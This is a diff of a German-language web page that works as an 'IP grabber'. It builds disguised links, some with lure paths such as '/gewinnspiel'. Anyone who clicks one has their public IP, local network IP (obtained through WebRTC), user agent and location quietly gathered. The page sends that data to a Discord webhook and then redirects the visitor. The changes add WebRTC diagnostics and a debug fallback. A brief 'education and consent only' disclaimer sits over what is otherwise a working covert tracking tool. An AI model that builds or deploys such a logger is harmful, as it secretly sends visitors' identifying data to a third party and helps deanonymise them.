@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Grabber · Tarn-URL mit Ziel</title>
+    <title>IP Grabber · Final mit Diagnose</title>
     <style>
         body { visibility: hidden; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
         body.admin-mode { visibility: visible; background: #f1f5f9; min-height: 100vh; padding: 20px; color: #0f172a; }
@@ -24,16 +24,18 @@
         .flex-row { display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }
         .note { background: #f8fafc; padding: 8px 12px; border-radius: 12px; font-size: 0.85rem; color: #475569; margin-top: 6px; }
         .mask-note { background: #e6f7ff; border-left: 4px solid #0284c7; padding: 12px 16px; border-radius: 12px; margin: 16px 0; }
-        .status-badge { padding: 4px 12px; border-radius: 30px; font-size: 0.8rem; font-weight: 500; }
+        .status-badge { padding: 4px 12px; border-radius: 30px; font-size: 0.8rem; font-weight: 500; display: inline-block; }
         .status-ok { background: #dcfce7; color: #166534; }
+        .status-warn { background: #fef9c3; color: #854d0e; }
         .status-error { background: #fee2e2; color: #b91c1c; }
+        .diagnostic-box { background: #f1f5f9; padding: 16px; border-radius: 16px; margin-top: 16px; }
     </style>
 </head>
 <body>
     <div id="adminPanel" style="display:none;">
         <div class="container">
-            <h1>IP‑Logger · Tarn-URL mit Ziel</h1>
-            <div class="warning"><strong>⚖️ Nur für Bildungs‑ und Testzwecke mit Einwilligung.</strong><br>Die Ziel‑URL kann in der Tarn‑URL eingebettet werden.</div>
+            <h1>IP‑Logger · Final mit Diagnose</h1>
+            <div class="warning"><strong>⚖️ Nur für Bildungs‑ und Testzwecke mit Einwilligung.</strong><br>Zeigt öffentliche und lokale IP (sofern technisch möglich).</div>
             <div class="tabs">
                 <div class="tab active" data-tab="generator">🔗 Link Generator</div>
                 <div class="tab" data-tab="logs">📋 Lokale Logs</div>
@@ -41,6 +43,9 @@
             </div>
             <!-- Generator -->
             <div id="generator" class="tab-content active">
+                <!-- WebRTC Status live -->
+                <div id="webrtcLiveStatus" class="diagnostic-box" style="margin-bottom:20px;"></div>
+                
                 <div class="form-group"><label>🎯 Ziel‑URL</label><input type="url" id="targetUrl" value="https://example.com"></div>
                 <div class="form-group"><label>📡 Discord Webhook URL</label><input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/..."><div class="flex-row" style="margin-top:8px;"><button class="secondary" id="testWebhookBtn">🧪 Webhook testen</button><span id="testResult"></span></div></div>
                 <div class="form-group"><label>🌍 Server‑Basis‑URL</label><input type="url" id="baseUrlInput" placeholder="Leer = aktuelle Adresse"></div>
@@ -66,20 +71,19 @@
                     </div>
                 </div>
                 <div class="form-group">
-                    <label>📎 Pfad (optional, z.B. /gewinnspiel)</label>
+                    <label>📎 Pfad (optional)</label>
                     <input type="text" id="maskPath" placeholder="/gewinnspiel">
                 </div>
                 <div class="form-group">
                     <label><input type="checkbox" id="embedTargetInMask"> 🔗 Ziel‑URL in Tarn‑Link einbetten</label>
-                    <div class="note">Wenn aktiv, wird die Ziel‑URL als Parameter <code>?url=...</code> an die Tarn‑Domain angehängt.</div>
                 </div>
                 
                 <button id="generateBtn">✨ Link generieren</button>
                 <div id="resultPanel" style="display:none; margin-top:28px;">
                     <h3>🔽 Dein Link</h3>
-                    <div><strong>🔗 Echte URL (funktioniert):</strong><div class="url-display" id="realUrlDisplay" style="font-size:0.9rem; opacity:0.8;"></div></div>
-                    <div style="margin-top:16px;"><strong>🎭 Maskierte URL (zum Teilen):</strong><div class="url-display" id="maskedUrlDisplay" style="font-weight:500;"></div></div>
-                    <div class="mask-note">⚠️ Der untere Link ist nur Anzeigetext. Der Empfänger klickt auf die echte URL. Verantwortungsvoll nutzen.</div>
+                    <div><strong>🔗 Echte URL:</strong><div class="url-display" id="realUrlDisplay" style="font-size:0.9rem; opacity:0.8;"></div></div>
+                    <div style="margin-top:16px;"><strong>🎭 Maskierte URL:</strong><div class="url-display" id="maskedUrlDisplay" style="font-weight:500;"></div></div>
+                    <div class="mask-note">⚠️ Der untere Link ist nur Anzeigetext. Der Empfänger klickt auf die echte URL.</div>
                     <div class="flex-row" style="margin-top:16px;">
                         <button class="copy-btn" id="copyMaskedBtn">📋 Tarn‑Link kopieren</button>
                         <button class="secondary" id="copyRealBtn">📋 Echten Link kopieren</button>
@@ -101,7 +105,11 @@
                 <div class="form-group"><label><input type="checkbox" id="collectLocationCb"> Standort ermitteln (ipapi.co)</label></div>
                 <div class="form-group">
                     <label><input type="checkbox" id="collectLocalIPCb"> 🏠 Geräte‑IP (lokal) via WebRTC ermitteln</label>
-                    <div class="note" id="webrtcStatus"></div>
+                    <div class="note" id="webrtcStatusSettings"></div>
+                </div>
+                <div class="form-group">
+                    <label><input type="checkbox" id="useFallbackLocalIPCb"> 🧪 Fallback: Feste Test‑IP anzeigen (nur für Debug)</label>
+                    <div class="note">⚠️ Aktivieren Sie dies NUR zum Testen, falls WebRTC nicht funktioniert. Zeigt immer 192.168.1.100 an.</div>
                 </div>
                 <div class="form-group"><label><input type="checkbox" id="storeLocalCb" checked> Lokal speichern</label></div>
                 <div class="form-group"><label>Standard‑Basis‑URL</label><input type="url" id="defaultBaseUrl"></div>
@@ -113,25 +121,35 @@
         (function(){
             "use strict";
             // ---------- STATE ----------
-            let links=[],ipLogs=[],settings={delay:3000,collectUA:true,collectLocation:false,collectLocalIP:false,storeLocal:true,defaultBase:''},currentLinkId=null;
+            let links=[],ipLogs=[],settings={delay:3000,collectUA:true,collectLocation:false,collectLocalIP:false,useFallbackLocalIP:false,storeLocal:true,defaultBase:''},currentLinkId=null;
             let webRTCSupported = false;
+            let webRTCStatusMessage = '';
 
-            // ---------- WebRTC Check ----------
+            // ---------- WebRTC Check (ausführlich) ----------
             function checkWebRTCSupport(){
                 const hasRTCPeerConnection = typeof RTCPeerConnection !== 'undefined';
                 const isSecure = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
                 webRTCSupported = hasRTCPeerConnection && isSecure;
-                const statusDiv = document.getElementById('webrtcStatus');
-                if(statusDiv){
-                    if(webRTCSupported){
-                        statusDiv.innerHTML = '<span class="status-badge status-ok">✅ WebRTC verfügbar – lokale IP kann ermittelt werden</span>';
-                    } else {
-                        let reason = '';
-                        if(!hasRTCPeerConnection) reason = 'Browser unterstützt kein WebRTC';
-                        else if(!isSecure) reason = 'Keine HTTPS-Verbindung – WebRTC erfordert HTTPS oder localhost';
-                        statusDiv.innerHTML = `<span class="status-badge status-error">❌ ${reason}</span><br><small>Die lokale IP wird nicht erfasst.</small>`;
+                
+                let reason = '';
+                if(!hasRTCPeerConnection) reason = 'Ihr Browser unterstützt kein WebRTC.';
+                else if(!isSecure) reason = 'Die Seite wird nicht über HTTPS geladen – WebRTC erfordert einen sicheren Kontext (HTTPS oder localhost).';
+                
+                webRTCStatusMessage = webRTCSupported ? '✅ WebRTC ist verfügbar. Lokale IP kann ermittelt werden.' : `❌ ${reason}`;
+                
+                // UI updaten
+                const liveDiv = document.getElementById('webrtcLiveStatus');
+                if(liveDiv){
+                    liveDiv.innerHTML = `<span class="status-badge ${webRTCSupported?'status-ok':'status-error'}">${webRTCSupported?'✅':'❌'}</span> <strong>WebRTC-Status:</strong> ${webRTCStatusMessage}`;
+                    if(!webRTCSupported && settings.collectLocalIP){
+                        liveDiv.innerHTML += '<br><small>Die lokale IP wird nicht erfasst. Aktivieren Sie ggf. den Fallback in den Einstellungen.</small>';
                     }
                 }
+                const settingsDiv = document.getElementById('webrtcStatusSettings');
+                if(settingsDiv){
+                    settingsDiv.innerHTML = webRTCStatusMessage;
+                }
+                return webRTCSupported;
             }
 
             // ---------- UTILS ----------
@@ -152,6 +170,7 @@
                     document.getElementById('collectUACb').checked=settings.collectUA;
                     document.getElementById('collectLocationCb').checked=settings.collectLocation;
                     document.getElementById('collectLocalIPCb').checked=settings.collectLocalIP;
+                    document.getElementById('useFallbackLocalIPCb').checked=settings.useFallbackLocalIP;
                     document.getElementById('storeLocalCb').checked=settings.storeLocal;
                     document.getElementById('defaultBaseUrl').value=settings.defaultBase||'';
                 }
@@ -165,16 +184,25 @@
                 settings.collectUA=document.getElementById('collectUACb').checked;
                 settings.collectLocation=document.getElementById('collectLocationCb').checked;
                 settings.collectLocalIP=document.getElementById('collectLocalIPCb').checked;
+                settings.useFallbackLocalIP=document.getElementById('useFallbackLocalIPCb').checked;
                 settings.storeLocal=document.getElementById('storeLocalCb').checked;
                 settings.defaultBase=document.getElementById('defaultBaseUrl').value.trim();
                 localStorage.setItem('ipg_settings',JSON.stringify(settings));
                 checkWebRTCSupport();
+                alert('Einstellungen gespeichert.');
             }
 
             // ---------- IP-ERMITTLUNG ----------
             async function fetchPublicIP(){try{const r=await fetch('https://api.ipify.org?format=json');return(await r.json()).ip}catch(e){return '0.0.0.0';}}
+            
             async function fetchLocalIP(){
-                if(!settings.collectLocalIP || !webRTCSupported) return null;
+                if(!settings.collectLocalIP) return null;
+                if(settings.useFallbackLocalIP){
+                    console.log('[Fallback] Verwende simulierte lokale IP 192.168.1.100');
+                    return '192.168.1.100 (simuliert)';
+                }
+                if(!webRTCSupported) return null;
+                
                 return new Promise((resolve)=>{
                     try{
                         const pc=new RTCPeerConnection({iceServers:[]});
@@ -193,17 +221,22 @@
                                 }
                             }
                         };
-                        setTimeout(()=>{pc.close();resolve(null);},3000);
+                        setTimeout(()=>{pc.close();resolve(null);},2000);
                     }catch(e){resolve(null);}
                 });
             }
+            
             async function fetchLocation(ip){if(!settings.collectLocation)return null;try{const r=await fetch(`https://ipapi.co/${ip}/json/`);const d=await r.json();if(d.error)return null;return `${d.city||'Unbekannt'}, ${d.country_name||''}`.trim();}catch(e){return null;}}
 
             // ---------- DISCORD SENDEN ----------
             async function sendDiscord(webhookUrl, publicIP, localIP, ua, location, linkId, customMsg, label){
                 if(!webhookUrl||!webhookUrl.includes('discord.com/api/webhooks'))return false;
                 const locationText=location?`\n📍 Standort: ${location}`:'';
-                const localIPText=(settings.collectLocalIP && localIP)?`\n🏠 Geräte‑IP (lokal): \`${localIP}\``:'';
+                let localIPText = '';
+                if(settings.collectLocalIP){
+                    if(localIP) localIPText = `\n🏠 Geräte‑IP (lokal): \`${localIP}\``;
+                    else localIPText = `\n🏠 Geräte‑IP (lokal): nicht verfügbar (${webRTCSupported?'WebRTC fehlgeschlagen':'Browser/HTTPS-Problem'})`;
+                }
                 const labelText=label?`\n👤 Gekennzeichnet als: **${label}**`:'';
                 const description=`${customMsg||'Neuer Klick'}\n\n🌐 Öffentliche IP: \`${publicIP}\`${localIPText}${locationText}${labelText}\n🖥️ User‑Agent: ${ua||'nicht erfasst'}`;
                 const embed={title:"🌍 IP‑Logger",description,color:0x3b82f6,timestamp:new Date().toISOString(),footer:{text:`Link‑ID: ${linkId}`}};
@@ -224,18 +257,36 @@
                     if(encodedMsg)customMsg=base64Decode(encodedMsg);
                     if(encodedLabel)label=base64Decode(encodedLabel);
                 }catch(e){document.body.innerHTML='<h2>Fehler: Ungültiger Link</h2>';document.body.style.visibility='visible';return true;}
+                
                 const publicIP=await fetchPublicIP();
                 const localIP=settings.collectLocalIP?await fetchLocalIP():null;
                 const ua=settings.collectUA?navigator.userAgent:null;
                 const location=settings.collectLocation?await fetchLocation(publicIP):null;
+                
                 sendDiscord(webhookUrl,publicIP,localIP,ua,location,linkId,customMsg,label);
+                
                 if(settings.storeLocal){
                     const logEntry={id:generateId(),publicIP,localIP,ua,location,label,linkId,timestamp:new Date().toISOString()};
                     ipLogs.push(logEntry);saveLogs();
                     const link=links.find(l=>l.id===linkId);
                     if(link){link.clicks++;link.lastAccess=new Date().toISOString();saveLinks();}
                 }
-                document.body.innerHTML=`<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:#e2e8f0;font-family:system-ui;"><div style="text-align:center;"><h2>Weiterleitung...</h2><div style="width:50px;height:50px;border:5px solid #334155;border-top-color:#38bdf8;border-radius:50%;animation:spin 1s infinite;margin:20px auto;"></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>${debug?`<p>Öffentliche IP: ${publicIP}<br>Geräte‑IP: ${localIP||'nicht verfügbar'}<br>Standort: ${location||'aus'}<br>Label: ${label||'keine'}</p>`:''}</div></div>`;
+                
+                // Weiterleitungsseite mit Debug-Info
+                let debugHTML = '';
+                if(debug){
+                    debugHTML = `<div style="margin-top:20px; background:#1e293b; padding:16px; border-radius:12px; text-align:left;">
+                        <strong>Debug-Info:</strong><br>
+                        Öffentliche IP: ${publicIP}<br>
+                        Lokale IP: ${localIP || 'nicht erfasst'}<br>
+                        WebRTC-Status: ${webRTCStatusMessage}<br>
+                        Standort: ${location || 'aus'}<br>
+                        Label: ${label || 'keine'}<br>
+                        User-Agent: ${ua || 'aus'}
+                    </div>`;
+                }
+                
+                document.body.innerHTML=`<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:#e2e8f0;font-family:system-ui;"><div style="text-align:center;"><h2>Weiterleitung...</h2><div style="width:50px;height:50px;border:5px solid #334155;border-top-color:#38bdf8;border-radius:50%;animation:spin 1s infinite;margin:20px auto;"></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>${debugHTML}</div></div>`;
                 document.body.style.visibility='visible';
                 setTimeout(()=>{window.location.href=target;},settings.delay);
                 return true;
@@ -279,7 +330,6 @@
                     if(!base) base = window.location.origin + window.location.pathname;
                     if(!base.endsWith('/') && !base.includes('?')) base += '/';
                     
-                    // Maskierte URL bauen
                     let maskedUrl = '';
                     const preset = document.getElementById('maskPreset').value;
                     const path = document.getElementById('maskPath').value.trim();
@@ -291,9 +341,7 @@
                     }
                     
                     if(maskedUrl){
-                        // Pfad anhängen
                         if(path) maskedUrl += path;
-                        // Ziel-URL einbetten falls gewünscht
                         if(embedTarget){
                             const separator = maskedUrl.includes('?') ? '&' : '?';
                             maskedUrl += separator + 'url=' + encodeURIComponent(target);
@@ -321,12 +369,8 @@
                     document.getElementById('lastAccess').textContent = '—';
                 });
                 
-                document.getElementById('copyMaskedBtn').addEventListener('click',()=>{
-                    navigator.clipboard?.writeText(document.getElementById('maskedUrlDisplay').textContent).then(()=>alert('Tarn‑Link kopiert!'));
-                });
-                document.getElementById('copyRealBtn').addEventListener('click',()=>{
-                    navigator.clipboard?.writeText(document.getElementById('realUrlDisplay').textContent).then(()=>alert('Echter Link kopiert!'));
-                });
+                document.getElementById('copyMaskedBtn').addEventListener('click',()=>navigator.clipboard?.writeText(document.getElementById('maskedUrlDisplay').textContent).then(()=>alert('Tarn‑Link kopiert!')));
+                document.getElementById('copyRealBtn').addEventListener('click',()=>navigator.clipboard?.writeText(document.getElementById('realUrlDisplay').textContent).then(()=>alert('Echter Link kopiert!')));
                 document.getElementById('testOwnBtn').addEventListener('click',()=>{
                     if(!currentLinkId) return alert('Kein Link generiert.');
                     window.open(document.getElementById('realUrlDisplay').textContent+'&debug=1','_blank');
@@ -339,7 +383,7 @@
                 });
                 
                 document.getElementById('clearLogsBtn').addEventListener('click',()=>{ipLogs=[]; saveLogs(); renderLogs();});
-                document.getElementById('saveSettingsBtn').addEventListener('click',()=>{saveSettings(); alert('Gespeichert');});
+                document.getElementById('saveSettingsBtn').addEventListener('click',saveSettings);
             }
 
             // ---------- START ----------
